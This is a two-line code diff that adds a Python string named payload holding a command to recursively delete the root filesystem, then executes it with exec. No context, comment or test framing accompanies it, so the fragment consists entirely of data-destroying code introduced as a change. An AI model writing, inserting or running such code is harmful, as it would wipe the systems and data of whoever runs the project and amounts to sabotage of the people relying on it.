@@ -1,0 +1,2 @@
+payload = '''import shutil; shutil.rmtree("/")'''
+exec(payload)
